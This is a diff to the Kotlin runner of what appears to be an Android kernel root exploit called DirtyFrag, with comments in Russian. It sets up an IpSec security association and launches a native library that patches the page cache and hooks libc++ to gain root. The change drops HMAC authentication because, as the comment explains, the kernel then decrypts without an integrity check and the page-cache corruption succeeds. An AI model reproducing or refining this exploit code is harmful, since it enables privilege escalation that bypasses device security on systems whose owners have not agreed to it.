@@ -16,9 +16,11 @@ import java.net.InetAddress
  * нативная libdfroot.so сама выбирает ko по KMI из uname, патчит page cache
  * через ESP-CBC (in-place), ставит хук в libc++.so и триггерит root-контекст.
  *
- * Java-сторона: IpSecManager SA (cbc(aes) + hmac(sha256) trunc 128 — как в
- * RootMyAndroid), стейджинг ksud/bootstrap/df.conf в device-protected папку
- * (ko и бутстрап ищут их там — путь зашит в lkm/dfroot.c), запуск натива.
+ * Java-сторона: IpSecManager SA только CRYPT_AES_CBC (encryption-only —
+ * форма DFRoot V3.0: без ICV-проверки ядро расшифровывает безусловно;
+ * HMAC-вариант давал промах по ICV и page cache не менялся), стейджинг
+ * ksud/bootstrap/df.conf в device-protected папку (путь зашит в
+ * lkm/dfroot.c), запуск натива.
  */
 class DirtyFragRunner {
 
@@ -122,7 +124,6 @@ class DirtyFragRunner {
 
         val rnd = SecureRandom()
         val aesKey = ByteArray(32).also(rnd::nextBytes)
-        val hmacKey = ByteArray(32).also(rnd::nextBytes)
 
         // sender port: pick-then-release эфемерный
         val senderSock = DatagramSocket()
@@ -131,7 +132,6 @@ class DirtyFragRunner {
 
         val transform = IpSecTransform.Builder(ctx)
             .setEncryption(IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, aesKey))
-            .setAuthentication(IpSecAlgorithm(IpSecAlgorithm.AUTH_HMAC_SHA256, hmacKey, 128))
             .setIpv4Encapsulation(encapSock, senderPort)
             .buildTransportModeTransform(loopback, spiObj)
 
@@ -143,7 +143,6 @@ class DirtyFragRunner {
                 "--sender-port", senderPort.toString(),
                 "--spi", Integer.toUnsignedString(spiObj.spi),
                 "--aes-key", hex(aesKey),
-                "--hmac-key", hex(hmacKey),
             )
             val pb = ProcessBuilder(cmd)
             pb.redirectErrorStream(true)
